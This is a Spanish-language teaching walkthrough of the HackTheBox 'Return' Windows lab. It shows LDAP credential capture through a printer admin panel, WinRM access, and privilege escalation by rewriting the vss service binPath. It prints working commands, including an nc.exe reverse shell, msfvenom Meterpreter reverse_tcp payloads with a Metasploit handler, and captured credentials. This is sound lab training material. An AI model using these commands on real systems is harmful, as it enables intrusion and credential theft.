# HTB Return — Markdown final didáctico

## 1. Introducción del caso

Return es una máquina Windows de dificultad easy cuya cadena de compromiso se apoya en una configuración insegura de un panel de administración de impresora. El punto de entrada no fue una explotación por versión ni una vulnerabilidad compleja de Active Directory, sino una mala práctica operativa: el panel permitía modificar el servidor LDAP configurado y, al hacerlo, el backend intentaba autenticarse contra el nuevo destino con una cuenta de servicio.

La resolución completa quedó articulada en esta cadena:

```text
Panel de administración de impresora en IIS
→ configuración LDAP visible
→ modificación del servidor LDAP hacia la IP atacante
→ captura de credenciales de svc-printer
→ validación por WinRM
→ shell como return\svc-printer
→ pertenencia a Server Operators
→ modificación del binPath del servicio vss
→ ejecución como LocalSystem
→ sesión Meterpreter x64 estabilizada por migración
→ NT AUTHORITY\SYSTEM
→ lectura de root.txt
→ restauración del servicio vss
```

La máquina enseña tres ideas especialmente importantes:

1. Un panel aparentemente simple puede contener configuraciones de integración con dominio que valen más que una enumeración web genérica.
2. En Windows, los grupos del usuario comprometido son decisivos. En este caso, `Server Operators` fue el hallazgo que convirtió una cuenta de servicio en una vía de escalada.
3. La explotación por servicios requiere trazabilidad: documentar el servicio original, modificarlo, ejecutar, confirmar contexto y restaurarlo.

---

## 2. Preparación y arranque del laboratorio

### Preparación automatizada

El arranque se realizó con el script propio `Inici-HTB`, utilizado para ordenar el entorno de trabajo, validar conectividad y generar evidencias iniciales:

```bash
Inici-HTB Return 10.129.95.241 easy
```

Este paso no forma parte de la explotación. Su función es preparar el caso para trabajar con método:

- crear la estructura de directorios;
- comprobar conectividad;
- estimar sistema operativo;
- lanzar escaneo completo de puertos;
- extraer puertos abiertos;
- ejecutar escaneo de servicios;
- generar una nota inicial con superficie dominante sugerida;
- dejar un siguiente paso único.

La estructura esperada del caso quedó orientada a separar evidencias y acciones posteriores:

```text
Return/
├── content/
├── exploits/
├── nmap/
│   ├── allPorts
│   ├── extractPorts.txt
│   ├── nmap_tcp_services.txt
│   ├── ping.txt
│   └── whichSystem.txt
└── notes/
    ├── 00_resumen_inicial.md
    └── 01_siguiente_paso.txt
```

La lectura didáctica de esta fase es sencilla: antes de buscar una vulnerabilidad hay que saber qué superficie existe realmente. Esta forma de trabajar evita abrir ramas por intuición y obliga a decidir por evidencia.

### Conectividad y estimación inicial

La conectividad fue correcta:

```text
64 bytes from 10.129.95.241: icmp_seq=1 ttl=127 time=48.3 ms
```

La estimación por TTL sugirió Windows:

```text
10.129.95.241 (ttl -> 127): Windows
```

Esta señal no debe tratarse como una verdad absoluta, pero sí como una pista razonable. En este caso fue coherente con el resto de la enumeración posterior.

---

## 3. Enumeración inicial de puertos y servicios

### Escaneo completo de puertos

El escaneo completo detectó una superficie extensa y claramente asociada a Windows/Active Directory:

```text
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49678,49681,49697,49723
```

Puertos relevantes:

| Puerto | Servicio | Lectura técnica |
|---:|---|---|
| 53 | DNS | Señal habitual en controlador o entorno de dominio |
| 80 | HTTP / IIS | Panel web visible |
| 88 | Kerberos | Autenticación de dominio |
| 389 / 636 | LDAP / LDAPS | Directorio Active Directory |
| 445 | SMB | Recursos compartidos / dominio |
| 5985 | WinRM | Acceso remoto PowerShell si hay credenciales |
| 9389 | ADWS | Active Directory Web Services |
| 47001 | HTTPAPI / WinRM auxiliar | Servicio Microsoft auxiliar, no web de negocio |

La superficie podía llevar a pensar en una rama AD pura, pero el puerto `80` devolvió un título muy concreto:

```text
http-title: HTB Printer Admin Panel
```

Esto cambió la prioridad de trabajo. No se trataba de una web genérica, sino de una aplicación con posible relación directa con la infraestructura de dominio.

### Escaneo de servicios

La salida de Nmap confirmó:

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0.)
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

También se identificó el host como `PRINTER`:

```text
Service Info: Host: PRINTER; OS: Windows
```

SMB tenía firma requerida:

```text
Message signing enabled and required
```

Y se observó un desfase horario:

```text
clock-skew: 18m33s
```

En una cadena Kerberos avanzada, el `clock-skew` podría ser crítico. En este caso no fue el camino principal, pero quedó correctamente registrado como dato de contexto.

---

## 4. Decisión de superficie dominante

### Hechos verificados

La máquina exponía servicios de dominio, pero también un panel HTTP con nombre específico:

```text
HTB Printer Admin Panel
```

La decisión inicial quedó así:

```text
Superficie dominante:
Windows / Active Directory con panel web IIS de impresora en el puerto 80.

Rama principal:
WEB-BASE orientada a panel de administración de impresora.

Ramas secundarias:
AD / SMB / LDAP / Kerberos.
WinRM pendiente de credenciales.
SMB pendiente de comprobar acceso anónimo o información de dominio.
```

### Explicación didáctica

En un host con Kerberos, LDAP, SMB y WinRM se debe tener presente la rama Active Directory. Sin embargo, el panel de impresora era más accionable en ese momento porque ofrecía una superficie concreta, navegable y potencialmente conectada con LDAP.

Los paneles de impresoras corporativas suelen almacenar configuraciones de:

- servidor LDAP;
- servidor SMB;
- dominio;
- usuario de servicio;
- contraseña o secreto de integración;
- rutas de escaneo o almacenamiento.

Por tanto, antes de forzar SMB, Kerberos o WinRM, tenía sentido revisar el panel web y buscar configuración reutilizable.

---

## 5. Enumeración SMB inicial

Se ejecutó `enum4linux` para comprobar si SMB ofrecía información útil sin credenciales:

```bash
enum4linux -a 10.129.95.241 | tee content/enum4linux_return.txt
```

### Resultado relevante

La herramienta confirmó el dominio:

```text
Domain Name: RETURN
Domain Sid: S-1-5-21-3750359090-2939318659-876128439

[+] Host is part of a domain (not a workgroup)
```

Sin embargo, las consultas útiles fallaron por permisos:

```text
NT_STATUS_ACCESS_DENIED
```

No se obtuvieron:

- usuarios;
- shares útiles;
- política de contraseñas;
- RID cycling;
- información de impresora por spoolss.

### Interpretación

SMB fue útil para confirmar contexto de dominio, pero no abrió una vía operativa sin credenciales. Por tanto, quedó como rama secundaria.

Esta fase ilustra una distinción importante: que una herramienta confirme una sesión parcial o información mínima no significa que esa rama sea explotable. Aquí SMB aportó contexto, no acceso.

---

## 6. Revisión del panel web

### Descarga y lectura inicial

Se descargó la página principal:

```bash
curl -sS -D content/http_root_headers.txt http://10.129.95.241/ -o content/http_root.html
```

Después se filtraron referencias útiles:

```bash
grep -Ei 'href|settings|printer|ldap|server|username|password|domain|port' content/http_root.html
```

La salida confirmó el título del panel y mostró enlaces internos:

```html
<title>HTB Printer Admin Panel</title>
<a href="index.php" data-link="true">Home</a>
<a href="settings.php" data-link="true">Settings</a>
<a href="javascript:void(0)" data-link="true">Fax</a>
<a href="javascript:void(0)" data-link="true">Troubleshooting</a>
```

### Error inicial con la ruta `/settings`

Se probó inicialmente:

```bash
curl -sS -D content/http_settings_headers.txt http://10.129.95.241/settings -o content/http_settings.html
```

El resultado fue un error:

```html
<div id="header"><h1>Server Error</h1></div>
```

Este resultado no descartaba la sección de configuración. El HTML había mostrado la ruta exacta `settings.php`, no `/settings`.

### Lección del punto

No se debe convertir un error de ruta en un descarte de rama. El enlace real estaba en el HTML. La validación correcta era seguir la ruta observada:

```text
settings.php
```

---

## 7. Extracción de configuración LDAP desde `settings.php`

### Solicitud de la ruta correcta

Se descargó la página de configuración:

```bash
curl -sS -D content/http_settings_php_headers.txt http://10.129.95.241/settings.php -o content/http_settings_php.html
```

Se filtraron campos relevantes:

```bash
grep -Ei 'server|address|port|user|username|password|domain|ldap|smb|printer|value=|input|form|update' content/http_settings_php.html
```

Y se extrajo el formulario completo:

```bash
sed -n '/<form/,/<\/form>/p' content/http_settings_php.html
```

### Evidencia clave del formulario

La página respondía correctamente:

```text
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.13
```

El formulario tenía método `POST`:

```html
<form action="" method="POST">
```

El campo realmente modificable era:

```html
<input type="text" name="ip" value="printer.return.local"/>
```

Y el panel mostraba configuración LDAP:

```text
Server Address: printer.return.local
Server Port: 389
Username: svc-printer
Password: *******
```

### Interpretación

Este fue el primer hallazgo realmente explotable del caso. El panel no solo mostraba un usuario de servicio, sino que permitía modificar el servidor LDAP mediante el parámetro `ip`.

Eso abría una hipótesis muy concreta:

```text
Si el backend intenta validar o guardar la nueva configuración,
puede conectarse al servidor LDAP indicado usando svc-printer.
```

El siguiente paso no era adivinar la contraseña, sino observar si el propio objetivo la enviaba al configurar un servidor LDAP controlado.

---

## 8. Captura de credencial LDAP

### Preparación de la IP atacante

Primero se obtuvo la IP de la interfaz VPN:

```bash
ip -4 addr show tun0 | awk '/inet /{print $2}' | cut -d/ -f1
```

Resultado:

```text
10.10.15.26
```

### Listener LDAP controlado

Como el panel indicaba puerto LDAP `389`, se levantó un listener en ese puerto:

```bash
sudo nc -lvnp 389 | tee content/ldap_capture_svc_printer.txt
```

### Envío del formulario con servidor LDAP controlado

Se reprodujo el envío del formulario modificando solo el parámetro real observado:

```bash
curl -sS -i -X POST http://10.129.95.241/settings.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'ip=10.10.15.26' \
  | tee content/settings_update_response.txt
```

### Resultado obtenido

El listener recibió conexión desde el objetivo:

```text
connect to [10.10.15.26] from (UNKNOWN) [10.129.95.241] 49980
```

Dentro del flujo apareció la identidad:

```text
return\svc-printer
```

Y la contraseña:

```text
1edFg43012!!
```

### Interpretación técnica

La aplicación intentó autenticarse contra el servidor LDAP configurado y envió la credencial de `svc-printer`.

El hallazgo cambió la rama principal:

```text
Configuración expuesta de panel
→ credencial de dominio recuperada
→ validación contra servicios remotos
```

No se asumió aún acceso al sistema. La credencial debía validarse contra servicios existentes. WinRM era el candidato más fuerte porque ya estaba abierto en `5985`.

---

## 9. Validación de credencial por WinRM

### Comprobación rápida con NetExec

Se validó la credencial contra WinRM:

```bash
netexec winrm 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

Resultado:

```text
WINRM 10.129.95.241 5985 PRINTER [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
WINRM 10.129.95.241 5985 PRINTER [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

### Acceso interactivo

Se abrió sesión con Evil-WinRM:

```bash
evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

La identidad efectiva quedó confirmada:

```powershell
whoami
```

```text
return\svc-printer
```

### Error de contexto: comandos Linux en PowerShell

Durante la sesión se ejecutaron comandos como `id` y `ls -la`, que no pertenecen a PowerShell:

```text
The term 'id' is not recognized
A parameter cannot be found that matches parameter name 'la'
```

Esto no afectó a la explotación, pero sí dejó una lección operativa útil. Al entrar por WinRM se trabaja en PowerShell, no en una shell Linux.

Equivalencias prácticas:

| Linux | PowerShell / Windows |
|---|---|
| `id` | `whoami /user` |
| grupos | `whoami /groups` |
| `ls -la` | `Get-ChildItem -Force` |
| `pwd` | `Get-Location` o `pwd` |
| `cat archivo` | `type archivo` o `Get-Content archivo` |

---

## 10. Enumeración local inicial y obtención de user

### Identidad, SID y grupos

Desde Evil-WinRM se documentó el contexto:

```powershell
hostname
whoami /user
whoami /groups
whoami /priv
```

Host:

```text
printer
```

Usuario:

```text
return\svc-printer
```

SID:

```text
S-1-5-21-3750359090-2939318659-876128439-1103
```

Grupos relevantes:

```text
BUILTIN\Server Operators
BUILTIN\Print Operators
BUILTIN\Remote Management Users
```

Privilegios habilitados relevantes:

```text
SeMachineAccountPrivilege
SeLoadDriverPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeShutdownPrivilege
SeRemoteShutdownPrivilege
```

### Lectura didáctica

`Remote Management Users` explica el acceso por WinRM. Sin ese permiso, una credencial válida de dominio no necesariamente habría permitido una shell remota.

`Server Operators` fue el hallazgo clave de escalada. Este grupo puede operar determinados servicios del sistema. Si un usuario puede modificar la ruta de ejecución de un servicio que corre como `LocalSystem`, puede convertir esa capacidad en ejecución privilegiada.

`SeBackupPrivilege` y `SeRestorePrivilege` también eran interesantes, pero quedaron como ramas secundarias porque `Server Operators` ofrecía una vía más directa y coherente con el caso.

### Primera flag

Se revisó el escritorio del usuario:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Desktop
```

Se encontró `user.txt`:

```text
-ar--- 5/8/2026 5:06 AM 34 user.txt
```

Y se leyó:

```powershell
Get-Content C:\Users\svc-printer\Desktop\user.txt
```

Resultado:

```text
46a4f8c3e5bba0afe3432d836dc35450
```

---

## 11. Análisis de escalada: Server Operators y servicio `vss`

### Por qué se revisó `vss`

La hipótesis de escalada era:

```text
svc-printer pertenece a Server Operators
→ puede operar servicios
→ si un servicio corre como LocalSystem y puede modificarse
→ se puede ejecutar un binario controlado como SYSTEM
```

Se comenzó por el servicio `vss` porque es un servicio conocido de Windows, bajo demanda, y en esta máquina permitía consulta y manipulación.

### Pruebas iniciales sobre servicios

Una consulta global del Service Control Manager falló:

```powershell
sc.exe query
```

```text
[SC] OpenSCManager FAILED 5:
Access is denied.
```

Sin embargo, la consulta específica de `vss` sí funcionó:

```powershell
sc.exe qc vss
```

Salida relevante:

```text
SERVICE_NAME: vss
START_TYPE         : 3   DEMAND_START
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

La consulta WMI mediante `Get-CimInstance` falló por permisos:

```text
Access denied
```

Pero `sc.exe` proporcionó la información necesaria.

### Validación de control sobre el servicio

El servicio estaba detenido:

```powershell
sc.exe stop vss
```

```text
[SC] ControlService FAILED 1062:
The service has not been started.
```

Se pudo iniciar:

```powershell
sc.exe start vss
```

```text
STATE : 2 START_PENDING
PID   : 2528
```

Y después apareció como `RUNNING`:

```powershell
sc.exe query vss
```

```text
STATE : 4 RUNNING
```

### Confirmación de modificación del `binPath`

La prueba crítica fue modificar el `BINARY_PATH_NAME` manteniendo el valor original:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

Resultado:

```text
[SC] ChangeServiceConfig SUCCESS
```

Este resultado validó que `svc-printer` podía modificar la configuración del servicio.

La combinación ya era suficiente para justificar la vía:

```text
servicio modificable
+ servicio ejecutado como LocalSystem
+ capacidad de iniciar/detener el servicio
= primitiva de ejecución privilegiada
```

---

## 12. Intentos de validación por fichero y problemas encontrados

### Prueba inicial con `whoami`

Se intentó ejecutar un comando simple mediante el servicio:

```powershell
sc.exe config vss binPath= "cmd.exe /c whoami > C:\Users\svc-printer\Documents\whoami_system.txt"
sc.exe start vss
```

El servicio devolvió:

```text
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```

Este error era esperable: `cmd.exe /c whoami` no es un servicio Windows real. El Service Control Manager espera que el proceso se comporte como servicio; un comando puntual termina rápido o no responde al protocolo esperado.

El fichero se creó, pero vacío:

```text
Length Name
------ ----
0      whoami_system.txt
```

### Problemas de comillas y redirecciones

Se intentó mejorar la sintaxis con comillas y redirección de errores:

```powershell
sc.exe config vss binPath= 'C:\Windows\System32\cmd.exe /c "whoami > C:\Windows\Temp\whoami_system.txt 2>&1"'
```

Pero `sc.exe` devolvió su ayuda de uso, lo que indicaba que el comando no se aplicó:

```text
USAGE:
        sc <server> config [service name] <option1> <option2>...
```

La lección aquí fue importante: cuando `sc.exe` muestra ayuda, no se debe asumir que ha aplicado nada. Siempre hay que confirmar con:

```powershell
sc.exe qc vss
```

### Uso de `--%` en PowerShell

Para evitar que PowerShell interpretase redirecciones y comillas, se usó el operador de parada de parsing:

```powershell
sc.exe --% config vss binPath= "C:\Windows\System32\cmd.exe /c echo prueba_servicio > C:\Windows\Temp\svc_test.txt"
```

La configuración quedó aplicada:

```text
[SC] ChangeServiceConfig SUCCESS
BINARY_PATH_NAME : C:\Windows\System32\cmd.exe /c echo prueba_servicio > C:\Windows\Temp\svc_test.txt
SERVICE_START_NAME : LocalSystem
```

El servicio volvió a devolver `1053`, pero el fichero existía. El problema fue que el usuario no podía leerlo:

```text
Access to the path 'C:\Windows\Temp\svc_test.txt' is denied.
```

### Interpretación

Estos intentos no invalidaron la técnica. Al contrario, confirmaron que:

- el `binPath` podía cambiarse;
- el servicio intentaba ejecutar lo configurado;
- el error `1053` no era criterio de descarte;
- la redirección a fichero añadía demasiada fricción por sintaxis y permisos.

La decisión correcta fue abandonar la validación por fichero y pasar a una conexión inversa.

---

## 13. Primer cambio de táctica: `nc.exe` como shell inversa

### Preparación del binario

Inicialmente se intentó subir `nc.exe` desde una ruta absoluta:

```powershell
upload /usr/share/windows-resources/binaries/nc.exe
```

Evil-WinRM lo interpretó como ruta relativa al directorio local del laboratorio:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/usr/share/windows-resources/binaries/nc.exe
```

y falló:

```text
No such file or directory
```

También se intentó `upload nc.exe`, pero el fichero aún no existía en el directorio local:

```text
No such file or directory /home/r4mon/pentest/targets/HTB/easy/Return/nc.exe
```

### Error de contexto: buscar en Parrot desde Evil-WinRM

Se ejecutó por error un comando Linux dentro de PowerShell remoto:

```powershell
find /usr/share -type f -iname 'nc.exe' 2>/dev/null
```

PowerShell interpretó `/dev/null` como ruta Windows:

```text
Could not find a part of the path 'C:\dev\null'
```

Este fue un error operativo útil para documentar. Había que separar claramente:

```text
Terminal local de Parrot ≠ sesión PowerShell remota por Evil-WinRM
```

### Localización correcta de `nc.exe`

En la terminal local de Parrot se buscó el binario:

```bash
find /usr/share -type f -iname 'nc.exe' 2>/dev/null
```

Resultado:

```text
/usr/share/Seclists/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
```

Se copió al directorio del laboratorio:

```bash
cp -v /usr/share/seclists/Web-Shells/FuzzDB/nc.exe ./nc.exe
```

Se verificó:

```bash
ls -lh ./nc.exe
```

```text
28 KB ./nc.exe
```

Ahora sí se pudo subir:

```powershell
upload nc.exe
```

Resultado:

```text
Data: 37544 bytes of 37544 bytes copied
Info: Upload successful!
```

Y se confirmó en la víctima:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Documents\nc.exe
```

```text
28160 nc.exe
```

### Listener y modificación de `vss`

En Parrot se abrió listener:

```bash
rlwrap -cAr nc -lvnp 1234
```

```text
listening on [any] 1234 ...
```

Se configuró `vss` para ejecutar `nc.exe`:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.26 1234"
```

Se confirmó:

```powershell
sc.exe qc vss
```

```text
BINARY_PATH_NAME : C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.26 1234
SERVICE_START_NAME : LocalSystem
```

Al iniciar el servicio llegó una conexión:

```text
connect to [10.10.15.26] from (UNKNOWN) [10.129.95.241] 62773
Microsoft Windows [Version 10.0.17763.107]
C:\Windows\system32>
```

### Problema de estabilidad

La shell se cayó antes de confirmar `whoami`.

Este resultado fue suficiente para confirmar que el servicio ejecutaba el binario, pero no era una sesión estable. Se restauró el servicio:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

Confirmación:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

---

## 14. Segunda táctica: Meterpreter x86

### Generación del payload

Se comprobó que `msfvenom` estaba disponible:

```bash
which msfvenom
```

```text
/usr/bin/msfvenom
```

Se generó un payload Windows x86:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.26 LPORT=1337 -f exe -o shell.exe
```

Resultado:

```text
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Se verificó el binario:

```bash
ls -lh ./shell.exe
```

```text
72 KB ./shell.exe
```

### Handler de Metasploit

Se abrió Metasploit y se cargó el handler:

```text
use exploit/multi/handler
```

Metasploit seleccionó inicialmente un payload genérico:

```text
generic/shell_reverse_tcp
```

Se corrigió para que coincidiera con el binario:

```text
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.26
set LPORT 1337
show options
```

Opciones relevantes:

```text
Payload options (windows/meterpreter/reverse_tcp):
LHOST 10.10.15.26
LPORT 1337
```

Se arrancó el handler:

```text
run
```

```text
Started reverse TCP handler on 10.10.15.26:1337
```

### Subida y ejecución

Se subió el binario:

```powershell
upload shell.exe
```

Resultado:

```text
Data: 98400 bytes of 98400 bytes copied
Info: Upload successful!
```

Se confirmó en la víctima:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Documents\shell.exe
```

```text
73802 shell.exe
```

Se configuró `vss`:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\shell.exe"
```

Confirmación:

```text
BINARY_PATH_NAME : C:\Users\svc-printer\Documents\shell.exe
SERVICE_START_NAME : LocalSystem
```

Al iniciar el servicio, Metasploit recibió sesión:

```text
Meterpreter session 1 opened (10.10.15.26:1337 -> 10.129.95.241:53876)
```

Pero murió inmediatamente:

```text
Meterpreter session 1 closed. Reason: Died
```

### Interpretación

La ejecución estaba confirmada, pero la estabilidad seguía siendo insuficiente. La siguiente hipótesis fue que el payload x86 no era el más adecuado para una máquina Windows Server 2019 de 64 bits.

Se restauró nuevamente `vss`.

---

## 15. Tercera táctica: Meterpreter x64 con migración automática

### Generación de payload x64

Se generó un ejecutable x64:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.26 LPORT=4444 -f exe -o shell64.exe
```

Resultado:

```text
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell64.exe
```

Se verificó:

```bash
ls -lh ./shell64.exe
```

```text
7.0 KB ./shell64.exe
```

### Configuración del handler x64

En Metasploit:

```text
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.15.26
set LPORT 4444
show options
```

Opciones:

```text
Payload options (windows/x64/meterpreter/reverse_tcp):
LHOST 10.10.15.26
LPORT 4444
```

Se arrancó el handler:

```text
run
```

```text
Started reverse TCP handler on 10.10.15.26:4444
```

### Subida del binario

Se subió `shell64.exe`:

```powershell
upload shell64.exe
```

Resultado:

```text
Data: 9556 bytes of 9556 bytes copied
Info: Upload successful!
```

Se verificó en la víctima:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Documents\shell64.exe
```

```text
7168 shell64.exe
```

### Primer intento x64

Se configuró `vss`:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\shell64.exe"
```

Se confirmó:

```text
BINARY_PATH_NAME : C:\Users\svc-printer\Documents\shell64.exe
SERVICE_START_NAME : LocalSystem
```

La sesión abrió, pero se volvió a cometer un error de contexto: se intentó usar `whoami` dentro de Meterpreter.

```text
[-] Unknown command: whoami. Run the help command for more details.
```

El comando correcto en Meterpreter era:

```text
getuid
```

La sesión terminó muriendo antes de confirmarlo.

### Migración automática

Para evitar que la sesión muriera antes de migrar manualmente, se configuró la migración automática en Metasploit:

```text
set AutoRunScript post/windows/manage/migrate
```

Resultado:

```text
AutoRunScript => post/windows/manage/migrate
```

Se relanzó el handler:

```text
run
```

```text
Started reverse TCP handler on 10.10.15.26:4444
```

Se volvió a configurar `vss` con `shell64.exe` y se inició el servicio.

Metasploit recibió la sesión y migró automáticamente:

```text
Session ID 3 (10.10.15.26:4444 -> 10.129.95.241:49652) processing AutoRunScript 'post/windows/manage/migrate'
Running module against PRINTER
Current server process: shell64.exe (3856)
Spawning notepad.exe process to migrate into
Migrating into 688
[+] Successfully migrated into process 688
Meterpreter session 3 opened
```

### Confirmación de SYSTEM

En Meterpreter se usó el comando correcto:

```text
getuid
```

Resultado:

```text
Server username: NT AUTHORITY\SYSTEM
```

La escalada quedaba confirmada.

---

## 16. Obtención de root y limpieza

### Lectura de la flag final

Desde Meterpreter:

```text
cat C:\\Users\\Administrator\\Desktop\\root.txt
```

Resultado:

```text
19e7fb0b6df382040351bcfd3a9cd6ce
```

### Restauración final del servicio

Después de obtener la flag final, se restauró `vss`:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

Resultado:

```text
[SC] ChangeServiceConfig SUCCESS
```

Se confirmó:

```powershell
sc.exe qc vss
```

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

Esta restauración es una parte importante de la trazabilidad. La explotación modificó temporalmente una configuración sensible del sistema; el cierre correcto exige demostrar que el servicio volvió a su estado original.

---

## 17. Resumen técnico final

### Cadena validada

```text
1. Enumeración inicial:
   Windows / AD / IIS / WinRM / LDAP / SMB.

2. Superficie dominante:
   Panel web de impresora en IIS.

3. Hallazgo web:
   settings.php expone configuración LDAP.

4. Primitiva inicial:
   El campo Server Address puede modificarse mediante POST usando el parámetro ip.

5. Captura:
   Al apuntar el servidor LDAP a la IP atacante, el objetivo envía credenciales.

6. Credencial recuperada:
   return\svc-printer : 1edFg43012!!

7. Validación:
   WinRM acepta la credencial.

8. Acceso:
   Evil-WinRM como return\svc-printer.

9. Hallazgo local:
   svc-printer pertenece a Server Operators.

10. Escalada:
    vss corre como LocalSystem y permite modificación del binPath.

11. Ejecución:
    shell64.exe ejecutado mediante vss.

12. Estabilización:
    Meterpreter x64 + AutoRunScript migrate.

13. Privilegios:
    NT AUTHORITY\SYSTEM.

14. Cierre:
    root.txt leído y vss restaurado.
```

### Flags

```text
user.txt: 46a4f8c3e5bba0afe3432d836dc35450
root.txt: 19e7fb0b6df382040351bcfd3a9cd6ce
```

---

## 18. Lecciones reutilizables

### 18.1. Un panel simple puede ser más importante que una enumeración AD amplia

Aunque la máquina exponía muchos servicios de dominio, la vía real nació del panel web. La clave fue no tratar HTTP como una superficie secundaria solo porque existía Kerberos o LDAP.

Patrón reutilizable:

```text
Panel corporativo
→ configuración de integración
→ servidor modificable
→ autenticación saliente
→ captura de credencial
```

### 18.2. Los paneles de impresora suelen integrarse con LDAP o SMB

Una impresora multifunción corporativa puede necesitar:

- consultar usuarios en LDAP;
- guardar escaneos en shares;
- autenticarse contra dominio;
- usar cuentas de servicio.

Por eso, una sección `Settings` con `Server Address`, `Server Port`, `Username` y `Password` debe tratarse como hallazgo sensible.

### 18.3. Credencial encontrada no equivale a acceso final

La contraseña de `svc-printer` solo se convirtió en acceso real después de validarla contra WinRM:

```bash
netexec winrm 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

La comprobación separó:

```text
credencial observada
→ credencial válida
→ credencial explotable por WinRM
```

### 18.4. En Windows, los grupos importan tanto como el usuario

`svc-printer` no era administrador directo, pero pertenecía a `Server Operators`. Esa pertenencia permitió manipular servicios.

Comando clave:

```powershell
whoami /groups
```

La salida de grupos fue más importante que el contenido del directorio del usuario.

### 18.5. `sc.exe qc` debe acompañar a `sc.exe config`

Cada cambio de servicio se validó con:

```powershell
sc.exe qc vss
```

Esto evitó asumir que una modificación había funcionado cuando `sc.exe` solo había mostrado ayuda de uso.

Patrón recomendado:

```text
sc.exe config ...
→ comprobar ChangeServiceConfig SUCCESS
→ sc.exe qc ...
→ confirmar BINARY_PATH_NAME
→ iniciar servicio
```

### 18.6. El error 1053 no invalida necesariamente la ejecución

Al ejecutar comandos que no son servicios reales, `sc.exe start` puede devolver:

```text
StartService FAILED 1053
```

En este caso, el error no significaba que la ejecución fuese imposible. Significaba que el proceso lanzado no respondía como servicio Windows.

El indicador real debía ser:

- fichero creado;
- conexión recibida;
- sesión abierta;
- contexto confirmado.

### 18.7. Separar contexto local y remoto evita errores

Se produjo un error al ejecutar un comando Linux dentro de Evil-WinRM:

```powershell
find /usr/share -type f -iname 'nc.exe' 2>/dev/null
```

PowerShell intentó interpretar `/dev/null` como `C:\dev\null`.

Lección:

```text
Terminal Parrot:
  find, cp, msfvenom, msfconsole, nc listener.

Evil-WinRM:
  PowerShell remoto, sc.exe, Get-ChildItem, upload.

Meterpreter:
  getuid, cat, migrate, ps.
```

### 18.8. Meterpreter requiere comandos propios

Dentro de Meterpreter, `whoami` no es el comando adecuado:

```text
[-] Unknown command: whoami
```

Para confirmar usuario se usa:

```text
getuid
```

### 18.9. La estabilidad puede requerir migración

La shell con `nc.exe` y los primeros Meterpreter murieron rápido. La sesión estable llegó cuando se combinó:

```text
payload x64
+ handler correcto
+ AutoRunScript post/windows/manage/migrate
```

La migración automática permitió salir del proceso inicial `shell64.exe` y pasar a un proceso más estable:

```text
[+] Successfully migrated into process 688
```

### 18.10. Restaurar el servicio forma parte del cierre técnico

Después de modificar `vss`, el cierre correcto fue restaurar:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

Confirmación final:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

---

## 19. Puntos descartados o no desarrollados

### SMB sin credenciales

SMB confirmó el dominio `RETURN`, pero no permitió enumeración útil sin credenciales. Quedó como rama secundaria y no fue necesario volver a ella para completar la máquina.

### SeBackupPrivilege / SeRestorePrivilege

El usuario tenía privilegios interesantes como `SeBackupPrivilege` y `SeRestorePrivilege`, pero no se desarrollaron porque la vía de `Server Operators` era directa y suficiente.

### Validación por fichero

La validación mediante redirección de `whoami` a fichero resultó ruidosa por problemas de comillas, `1053` y permisos de lectura. Se abandonó correctamente en favor de una sesión inversa.

---

## 20. Criterio editorial aplicado

No se ha reconstruido una explotación distinta. El cuerpo principal conserva la cadena real del laboratorio, incluidos los errores útiles de contexto, los intentos fallidos de validación por fichero, los problemas de estabilidad y la restauración final de `vss`.

No se han corregido absurdidades técnicas en el anexo. Se han normalizado y reorganizado en el cuerpo principal las repeticiones mecánicas, los bloques rígidos y la secuencia operativa para producir una narración técnica más clara. Las notas operativas originales se conservan al final como trazabilidad.

---

# Anexo I — Notas operativas originales conservadas

